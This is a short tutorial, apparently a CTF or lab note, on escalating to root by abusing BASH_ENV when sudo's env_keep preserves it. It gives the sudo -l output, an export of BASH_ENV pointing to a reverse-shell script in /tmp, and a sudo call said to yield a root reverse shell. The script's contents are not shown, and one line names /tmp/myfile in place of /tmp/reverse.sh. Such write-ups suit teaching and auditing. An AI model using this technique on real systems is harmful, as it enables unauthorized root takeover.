# Introduction

`BASH_ENV` is an **environment variable** that tells Bash to **source a file** when it starts in **non-interactive mode** (i.e., when it’s running a script, not a shell for a user).
In nutshell, its env variable that points to file that gets executed before every bash script.

If you got user and run `sudo -l` and found `env_keep`, like this
```sh
sudo -l                                                                                                                                                                        
Matching Defaults entries for hish on environment:                                                                                                                                                 
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+="ENV BASH_ENV", use_pty                                                      
User may run the following commands on environment:                                                                                                                                           
    (ALL) /usr/bin/systeminfo 
```

## When exactly is `BASH_ENV` used?
It is used **only** when:
- Bash is launched in **non-interactive** mode
- Bash is **not in login shell** mode
This typically happens when:
- You run `bash script.sh`
- Or a script starts with `#!/bin/bash`
- Or `sudo` runs a bash script like the one you saw: `/usr/bin/systeminfo`

```sh
export BASH_ENV=/tmp/reverse.sh
```

Now, every time a script runs with Bash, it will execute the contents of /tmp/myfile before the actual script.

And if you can run any script with sudo privileges then the `/tmp/reverse.sh` also will get executed as root
```sh
sudo systeminfo

# Got reverse shell
```
